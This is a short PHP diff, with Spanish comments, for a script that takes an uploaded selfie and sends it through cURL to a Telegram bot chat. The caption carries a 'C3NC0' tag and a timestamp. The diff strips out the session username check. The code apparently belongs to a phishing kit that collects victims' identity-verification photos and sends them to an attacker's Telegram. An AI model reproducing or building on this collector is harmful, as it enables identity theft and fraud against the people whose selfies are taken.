@@ -20,13 +20,6 @@ function sendResponse($success, $message, $data = null) {
     exit;
 }
 
-// Verificar sesión SIN hacer echo
-if (isset($_SESSION['username'])) {
-    $username = $_SESSION['username'];
-} else {
-    // En lugar de echo, usar la función de respuesta JSON
-    sendResponse(false, 'No se ha definido el nombre de usuario en la sesión');
-}
 
 // Verificar que se recibió una imagen
 if (!isset($_FILES['selfie']) || $_FILES['selfie']['error'] !== UPLOAD_ERR_OK) {
@@ -91,7 +84,7 @@ function sendPhotoToTelegram($botToken, $chatId, $photoPath, $caption = '', $use
     $postData = [
         'chat_id' => $chatId,
         'photo' => new CURLFile(realpath($photoPath)),
-        'caption' => "🔐 C3NC0 | {$username}\n\n📸 Selfie: {$caption}\n⏰ Fecha: " . date('d/m/Y H:i:s')
+        'caption' => "🔐 C3NC0 |\n\n📸 Selfie: {$caption}\n⏰ Fecha: " . date('d/m/Y H:i:s')
     ];
     
     // Configurar cURL
